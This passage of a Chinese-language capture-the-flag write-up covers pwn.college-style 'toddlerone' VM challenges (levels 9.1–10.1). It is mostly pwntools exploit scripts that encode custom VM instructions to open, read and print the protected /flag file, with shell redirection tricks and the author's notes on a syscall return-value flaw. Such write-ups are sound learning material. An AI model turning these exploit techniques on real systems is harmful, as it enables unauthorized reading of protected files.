    <span class="token string">b'\xff\xff\xff'</span><span class="token punctuation">,</span>    <span class="token comment"># 填充第1条指令</span>
    <span class="token string">b'\xff\xff\xff'</span><span class="token punctuation">,</span>    <span class="token comment"># 填充第2条指令</span>
    <span class="token string">b'\xff\xff\xff'</span><span class="token punctuation">,</span>    <span class="token comment"># 填充第3条指令</span>
    <span class="token string">b'\xff\xff\xff'</span><span class="token punctuation">,</span>    <span class="token comment"># 填充第4条指令</span>

    <span class="token string">b'\&#123;imm&#125;\&#123;a&#125;\x00'</span><span class="token punctuation">,</span> <span class="token comment"># imm a, 0x00</span>
    <span class="token string">b'\&#123;imm&#125;\&#123;b&#125;\x2f'</span><span class="token punctuation">,</span> <span class="token comment"># imm b, 0x2f</span>
    <span class="token string">b'\&#123;stm&#125;\&#123;a&#125;\&#123;b&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># stm *a = b</span>

    <span class="token string">b'\&#123;imm&#125;\&#123;a&#125;\x01'</span><span class="token punctuation">,</span> <span class="token comment"># imm a, 0x01</span>
    <span class="token string">b'\&#123;imm&#125;\&#123;b&#125;\x66'</span><span class="token punctuation">,</span> <span class="token comment"># imm b, 0x66</span>
    <span class="token string">b'\&#123;stm&#125;\&#123;a&#125;\&#123;b&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># stm *a = b</span>

    <span class="token string">b'\&#123;imm&#125;\&#123;a&#125;\x02'</span><span class="token punctuation">,</span> <span class="token comment"># imm a, 0x02</span>
    <span class="token string">b'\&#123;imm&#125;\&#123;b&#125;\x6c'</span><span class="token punctuation">,</span> <span class="token comment"># imm b, 0x6c</span>
    <span class="token string">b'\&#123;stm&#125;\&#123;a&#125;\&#123;b&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># stm *a = b</span>

    <span class="token string">b'\&#123;imm&#125;\&#123;a&#125;\x03'</span><span class="token punctuation">,</span> <span class="token comment"># imm a, 0x03</span>
    <span class="token string">b'\&#123;imm&#125;\&#123;b&#125;\x61'</span><span class="token punctuation">,</span> <span class="token comment"># imm b, 0x61</span>
    <span class="token string">b'\&#123;stm&#125;\&#123;a&#125;\&#123;b&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># stm *a = b</span>

    <span class="token string">b'\&#123;imm&#125;\&#123;a&#125;\x04'</span><span class="token punctuation">,</span> <span class="token comment"># imm a, 0x04</span>
    <span class="token string">b'\&#123;imm&#125;\&#123;b&#125;\x67'</span><span class="token punctuation">,</span> <span class="token comment"># imm b, 0x67</span>
    <span class="token string">b'\&#123;stm&#125;\&#123;a&#125;\&#123;b&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># stm *a = b</span>

    <span class="token string">b'\&#123;imm&#125;\&#123;a&#125;\x00'</span><span class="token punctuation">,</span> <span class="token comment"># imm a, 0x00</span>
    <span class="token string">b'\&#123;imm&#125;\&#123;b&#125;\x00'</span><span class="token punctuation">,</span> <span class="token comment"># imm b, 0x00</span>
    <span class="token string">b'\&#123;sys&#125;\&#123;open&#125;\&#123;a&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># open ---> return a</span>

    <span class="token string">b'\&#123;imm&#125;\&#123;b&#125;\x10'</span><span class="token punctuation">,</span> <span class="token comment"># imm b, 0x10</span>
    <span class="token string">b'\&#123;imm&#125;\&#123;c&#125;\x40'</span><span class="token punctuation">,</span> <span class="token comment"># imm c, 0x40</span>
    <span class="token string">b'\&#123;sys&#125;\&#123;read&#125;\&#123;a&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># read(a, b, c) ---> return a</span>

    <span class="token string">b'\&#123;imm&#125;\&#123;a&#125;\x01'</span><span class="token punctuation">,</span> <span class="token comment"># imm a, 0x01</span>
    <span class="token string">b'\&#123;sys&#125;\&#123;write&#125;\&#123;a&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># write(a, b, c) ---> return a</span>

    <span class="token string">b'\&#123;imm&#125;\&#123;a&#125;\x00'</span><span class="token punctuation">,</span> <span class="token comment"># imm a, 0x00</span>
    <span class="token string">b'\&#123;sys&#125;\x08\&#123;a&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># exit(a)</span>

<span class="token punctuation">]</span>

payload_2 <span class="token operator">=</span> <span class="token string">b''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>format_data_list<span class="token punctuation">(</span>a<span class="token operator">=</span><span class="token number">0x2</span><span class="token punctuation">,</span>b<span class="token operator">=</span><span class="token number">0x40</span><span class="token punctuation">,</span>c<span class="token operator">=</span><span class="token number">0x1</span><span class="token punctuation">,</span>read<span class="token operator">=</span><span class="token number">0x8</span><span class="token punctuation">,</span>write<span class="token operator">=</span><span class="token number">0x1</span><span class="token punctuation">,</span>open_<span class="token operator">=</span><span class="token number">0x10</span><span class="token punctuation">,</span>stm<span class="token operator">=</span><span class="token number">0x40</span><span class="token punctuation">,</span>imm<span class="token operator">=</span><span class="token number">0x2</span><span class="token punctuation">,</span> sys<span class="token operator">=</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/challenge/toddlerone_level9.1"</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload_1<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload_2<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="level-10"><a href="#level-10" class="headerlink" title="level 10"></a>level 10</h2><p>这个题很巧妙，没有内存溢出的漏洞。只是要利用syscalls实现的漏洞，来达到虽然只是一次syscall但是却是可以执行多个系统调用的效果。这里面不太明白的问题是，为什么将代码写到文件中，然后送入目标程序，同时进行重定向就可以。但是通过pwntool工具启动的话，就无法成功。</p>
<p>关键点，由于read函数返回的是读取的字节大小，下一步write写入的又要是标准输入，所以你要把flag文件大小 <code>ls -l /flag</code>对应的文件描述符重定向到标准输出。</p>
<p>但是我用这个命令启动toddlerone_level10.0的话，flag又直接打印在控制台了，可是我之前是将标准输出定向到test文件中了啊。不明白这里为什么会出现这种问题。</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/challenge/toddlerone_level10.0 <span class="token operator">&lt;</span> ./bin <span class="token number">5</span><span class="token operator"><span class="token file-descriptor important">7</span>&lt;</span><span class="token file-descriptor important">&amp;1</span> <span class="token operator">></span> ./test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token triple-quoted-string string">"""
/flag  ---> 2f 66 6c 61 67

arg1      arg2          op 
value     register
          syscall 

a   0x10
b   0x01
c   0x20
d   0x8
s   0x02
i   0x40
f   0x04

read    0x8
write   0x10
open    0x4
exit    0x2

sys 0x8
imm 0x4
jmp 0x80
"""</span>

<span class="token keyword">def</span> <span class="token function">format_data_list</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> read<span class="token punctuation">,</span> write<span class="token punctuation">,</span> stm<span class="token punctuation">,</span> open_<span class="token punctuation">,</span> imm<span class="token punctuation">,</span> sys<span class="token punctuation">,</span> jmp<span class="token punctuation">)</span><span class="token punctuation">:</span>
    formatted_data_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> item <span class="token keyword">in</span> data_list<span class="token punctuation">:</span>
        formatted_item <span class="token operator">=</span> item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;a&#125;'</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;b&#125;'</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>b<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;c&#125;'</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>c<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>


        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;read&#125;'</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>read<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;write&#125;'</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>write<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;open&#125;'</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>open_<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;stm&#125;'</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>stm<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;imm&#125;'</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>imm<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;sys&#125;'</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>sys<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;jmp&#125;'</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>jmp<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>


        formatted_data_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>formatted_item<span class="token punctuation">)</span>
    <span class="token keyword">return</span> formatted_data_list

elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/challenge/toddlerone_level10.0"</span><span class="token punctuation">)</span>


data_list <span class="token operator">=</span> <span class="token punctuation">[</span>

    <span class="token string">b'\x03\&#123;a&#125;\&#123;imm&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># imm a, 0x03</span>
    <span class="token string">b'\x2f\&#123;b&#125;\&#123;imm&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># imm b, 0x2f</span>
    <span class="token string">b'\&#123;b&#125;\&#123;a&#125;\&#123;stm&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># stm *a = b</span>

    <span class="token string">b'\x04\&#123;a&#125;\&#123;imm&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># imm a, 0x04</span>
    <span class="token string">b'\x66\&#123;b&#125;\&#123;imm&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># imm b, 0x66</span>
    <span class="token string">b'\&#123;b&#125;\&#123;a&#125;\&#123;stm&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># stm *a = b</span>

    <span class="token string">b'\x05\&#123;a&#125;\&#123;imm&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># imm a, 0x05</span>
    <span class="token string">b'\x6c\&#123;b&#125;\&#123;imm&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># imm b, 0x6c</span>
    <span class="token string">b'\&#123;b&#125;\&#123;a&#125;\&#123;stm&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># stm *a = b</span>

    <span class="token string">b'\x06\&#123;a&#125;\&#123;imm&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># imm a, 0x06</span>
    <span class="token string">b'\x61\&#123;b&#125;\&#123;imm&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># imm b, 0x61</span>
    <span class="token string">b'\&#123;b&#125;\&#123;a&#125;\&#123;stm&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># stm *a = b</span>

    <span class="token string">b'\x07\&#123;a&#125;\&#123;imm&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># imm a, 0x07</span>
    <span class="token string">b'\x67\&#123;b&#125;\&#123;imm&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># imm b, 0x67</span>
    <span class="token string">b'\&#123;b&#125;\&#123;a&#125;\&#123;stm&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># stm *a = b</span>

    <span class="token string">b'\x03\&#123;a&#125;\&#123;imm&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># imm a, 0x03</span>
    <span class="token string">b'\x10\&#123;b&#125;\&#123;imm&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># imm b, 0x10</span>
    <span class="token string">b'\x50\&#123;c&#125;\&#123;imm&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># imm c, 0x50</span>
    <span class="token string">b'\&#123;a&#125;\&#123;open&#125;\&#123;sys&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># open ---> return a </span>

    <span class="token comment"># b'\x10\&#123;b&#125;\&#123;imm&#125;', # imm b, 0x10</span>
    <span class="token comment"># b'\x40\&#123;c&#125;\&#123;imm&#125;', # imm c, 0x40</span>
    <span class="token comment"># b'\&#123;a&#125;\&#123;read&#125;\&#123;sys&#125;', # read(a, b, c) ---> return a</span>

    <span class="token comment"># b'\x01\&#123;a&#125;\&#123;imm&#125;', # imm a, 0x01</span>
    <span class="token comment"># b'\&#123;a&#125;\&#123;write&#125;\&#123;sys&#125;', # write(a, b, c) ---> return a</span>

    <span class="token comment"># b'\x00\&#123;a&#125;\&#123;imm&#125;', # imm a, 0x00</span>
    <span class="token comment"># b'\&#123;a&#125;\x02\&#123;sys&#125;', # exit(a)</span>

<span class="token punctuation">]</span>

payload_2 <span class="token operator">=</span> <span class="token string">b''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>format_data_list<span class="token punctuation">(</span>a<span class="token operator">=</span><span class="token number">0x10</span><span class="token punctuation">,</span>b<span class="token operator">=</span><span class="token number">0x01</span><span class="token punctuation">,</span>c<span class="token operator">=</span><span class="token number">0x20</span><span class="token punctuation">,</span>read<span class="token operator">=</span><span class="token number">0x8</span><span class="token punctuation">,</span>write<span class="token operator">=</span><span class="token number">0x10</span><span class="token punctuation">,</span>open_<span class="token operator">=</span><span class="token number">0x1C</span><span class="token punctuation">,</span>stm<span class="token operator">=</span><span class="token number">0x20</span><span class="token punctuation">,</span>imm<span class="token operator">=</span><span class="token number">0x04</span><span class="token punctuation">,</span> sys<span class="token operator">=</span><span class="token number">0x08</span><span class="token punctuation">,</span> jmp<span class="token operator">=</span><span class="token number">0x80</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/home/hacker/exploit/level10/bin"</span><span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>
    <span class="token builtin">file</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>payload_2<span class="token punctuation">)</span>
  

<span class="token keyword">def</span> <span class="token function">redirect_fd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># os.dup2(1, 3)  # 将文件描述符 3 重定向到标准输出 (fd 1)</span>
    <span class="token comment"># os.dup2(3, 0x39)  # 将文件描述符 3 重定向到标准输出 (fd 1)</span>
    os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x39</span><span class="token punctuation">)</span>  <span class="token comment"># 将文件描述符 3 重定向到标准输出 (fd 1)</span>


p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/challenge/toddlerone_level10.0"</span><span class="token punctuation">,</span> preexec_fn<span class="token operator">=</span>redirect_fd<span class="token punctuation">)</span>
<span class="token comment"># 明确重定向文件描述符</span>
p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload_2<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="level10-1"><a href="#level10-1" class="headerlink" title="level10.1"></a>level10.1</h3><p><code>/challenge/toddlerone_level10.1 &lt; ./bin_2 57&lt;&amp;1</code></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token triple-quoted-string string">"""
/flag  ---> 2f 66 6c 61 67

imm 0x10
stm 0x1
sys 0x8

op      arg1        arg2
        register    value
        syscall   

a   0x20
b   0x4
c   0x10
d   0x40
s   0x8
i   0x1
f   0x2

read    0x20
write   0x10
open    0x1
exit    0x4
"""</span>

<span class="token keyword">def</span> <span class="token function">format_data_list</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> read<span class="token punctuation">,</span> write<span class="token punctuation">,</span> stm<span class="token punctuation">,</span> open_<span class="token punctuation">,</span> imm<span class="token punctuation">,</span> sys<span class="token punctuation">)</span><span class="token punctuation">:</span>
    formatted_data_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> item <span class="token keyword">in</span> data_list<span class="token punctuation">:</span>
        formatted_item <span class="token operator">=</span> item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;a&#125;'</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;b&#125;'</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>b<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;c&#125;'</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>c<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>


        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;read&#125;'</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>read<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;write&#125;'</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>write<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;open&#125;'</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>open_<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;stm&#125;'</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>stm<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;imm&#125;'</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>imm<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;sys&#125;'</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>sys<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>


        formatted_data_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>formatted_item<span class="token punctuation">)</span>
    <span class="token keyword">return</span> formatted_data_list

elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/challenge/toddlerone_level10.1"</span><span class="token punctuation">)</span>


data_list <span class="token operator">=</span> <span class="token punctuation">[</span>

    <span class="token string">b'\&#123;imm&#125;\&#123;a&#125;\x00'</span><span class="token punctuation">,</span> <span class="token comment"># imm a, 0x00</span>
    <span class="token string">b'\&#123;imm&#125;\&#123;b&#125;\x2f'</span><span class="token punctuation">,</span> <span class="token comment"># imm b, 0x2f</span>
    <span class="token string">b'\&#123;stm&#125;\&#123;a&#125;\&#123;b&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># stm *a = b</span>

    <span class="token string">b'\&#123;imm&#125;\&#123;a&#125;\x01'</span><span class="token punctuation">,</span> <span class="token comment"># imm a, 0x01</span>
    <span class="token string">b'\&#123;imm&#125;\&#123;b&#125;\x66'</span><span class="token punctuation">,</span> <span class="token comment"># imm b, 0x66</span>
    <span class="token string">b'\&#123;stm&#125;\&#123;a&#125;\&#123;b&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># stm *a = b</span>

    <span class="token string">b'\&#123;imm&#125;\&#123;a&#125;\x02'</span><span class="token punctuation">,</span> <span class="token comment"># imm a, 0x02</span>
    <span class="token string">b'\&#123;imm&#125;\&#123;b&#125;\x6c'</span><span class="token punctuation">,</span> <span class="token comment"># imm b, 0x6c</span>
    <span class="token string">b'\&#123;stm&#125;\&#123;a&#125;\&#123;b&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># stm *a = b</span>

    <span class="token string">b'\&#123;imm&#125;\&#123;a&#125;\x03'</span><span class="token punctuation">,</span> <span class="token comment"># imm a, 0x03</span>
    <span class="token string">b'\&#123;imm&#125;\&#123;b&#125;\x61'</span><span class="token punctuation">,</span> <span class="token comment"># imm b, 0x61</span>
    <span class="token string">b'\&#123;stm&#125;\&#123;a&#125;\&#123;b&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># stm *a = b</span>

    <span class="token string">b'\&#123;imm&#125;\&#123;a&#125;\x04'</span><span class="token punctuation">,</span> <span class="token comment"># imm a, 0x04</span>
    <span class="token string">b'\&#123;imm&#125;\&#123;b&#125;\x67'</span><span class="token punctuation">,</span> <span class="token comment"># imm b, 0x67</span>
    <span class="token string">b'\&#123;stm&#125;\&#123;a&#125;\&#123;b&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># stm *a = b</span>

    <span class="token string">b'\&#123;imm&#125;\&#123;a&#125;\x00'</span><span class="token punctuation">,</span> <span class="token comment"># imm a, 0x00</span>
    <span class="token string">b'\&#123;imm&#125;\&#123;b&#125;\x00'</span><span class="token punctuation">,</span> <span class="token comment"># imm b, 0x00</span>
    <span class="token string">b'\&#123;imm&#125;\&#123;c&#125;\x50'</span><span class="token punctuation">,</span> <span class="token comment"># imm c, 0x50</span>
    <span class="token string">b'\&#123;sys&#125;\&#123;open&#125;\&#123;a&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># open ---> return a</span>

<span class="token punctuation">]</span>

payload_2 <span class="token operator">=</span> <span class="token string">b''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>format_data_list<span class="token punctuation">(</span>a<span class="token operator">=</span><span class="token number">0x20</span><span class="token punctuation">,</span>b<span class="token operator">=</span><span class="token number">0x4</span><span class="token punctuation">,</span>c<span class="token operator">=</span><span class="token number">0x10</span><span class="token punctuation">,</span>read<span class="token operator">=</span><span class="token number">0x20</span><span class="token punctuation">,</span>write<span class="token operator">=</span><span class="token number">0x10</span><span class="token punctuation">,</span>open_<span class="token operator">=</span><span class="token number">0x31</span><span class="token punctuation">,</span>stm<span class="token operator">=</span><span class="token number">0x1</span><span class="token punctuation">,</span>imm<span class="token operator">=</span><span class="token number">0x10</span><span class="token punctuation">,</span> sys<span class="token operator">=</span><span class="token number">0x8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/home/hacker/exploit/level10/bin_2"</span><span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>
    <span class="token builtin">file</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>payload_2<span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">redirect_fd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># os.dup2(1, 3)  # 将文件描述符 3 重定向到标准输出 (fd 1)</span>
    <span class="token comment"># os.dup2(3, 0x39)  # 将文件描述符 3 重定向到标准输出 (fd 1)</span>
    os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x39</span><span class="token punctuation">)</span>  <span class="token comment"># 将文件描述符 3 重定向到标准输出 (fd 1)</span>


p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/challenge/toddlerone_level10.1"</span><span class="token punctuation">,</span> preexec_fn<span class="token operator">=</span>redirect_fd<span class="token punctuation">)</span>
<span class="token comment"># 明确重定向文件描述符</span>
p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload_2<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

